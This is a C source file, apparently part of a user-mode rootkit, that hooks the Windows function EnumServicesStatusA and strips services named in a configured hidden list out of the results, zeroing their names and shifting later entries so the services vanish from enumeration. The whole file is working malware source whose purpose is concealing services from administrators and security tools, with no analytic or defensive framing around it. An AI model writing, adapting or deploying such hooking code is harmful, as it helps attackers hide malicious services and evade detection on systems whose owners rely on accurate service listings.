#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "enumservicesstatusa.h"

// advapi32.EnumServicesStatusA
BOOL WINAPI NewEnumServicesStatusA(
	SC_HANDLE hSCManager,
	DWORD dwServiceType,
	DWORD dwServiceState,
	LPENUM_SERVICE_STATUS lpServices,
	DWORD cbBufSize,
	LPDWORD pcbBytesNeeded,
	LPDWORD lpServicesReturned,
	LPDWORD lpResumeHandle
)
{
	BOOL b;
	
	// call original function
	b=OldEnumServicesStatusA(
			hSCManager,
			dwServiceType,
			dwServiceState,
			lpServices,
			cbBufSize,
			pcbBytesNeeded,
			lpServicesReturned,
			lpResumeHandle
			);

	if (b || GetLastError()==ERROR_MORE_DATA)
	{
		DWORD dwNrOfSvc,dwCount;
		ENUM_SERVICE_STATUSA* pEnum=(ENUM_SERVICE_STATUSA*)lpServices;
		
		lpResumeHandle=NULL;
		dwNrOfSvc=*lpServicesReturned;
		for (dwCount=0;dwCount<dwNrOfSvc;dwCount++)
		{
			if (config_CheckString(ConfigHiddenService,pEnum->lpServiceName,0))
			{
				RtlZeroMemory(pEnum->lpDisplayName,strlen(pEnum->lpDisplayName));
				RtlZeroMemory(pEnum->lpServiceName,strlen(pEnum->lpServiceName));
				RtlCopyMemory((char*)pEnum,(char*)pEnum+sizeof(ENUM_SERVICE_STATUSA),sizeof(ENUM_SERVICE_STATUSA)*(dwNrOfSvc-(dwCount+1))); // hide handle
        		RtlZeroMemory((char*)pEnum+sizeof(ENUM_SERVICE_STATUSA)*(dwNrOfSvc-(dwCount+1)),sizeof(ENUM_SERVICE_STATUSA)); // delete last row
        		(*lpServicesReturned)--; // change number of services
			}
			else
				pEnum++;
		}
	}

	return b;
}
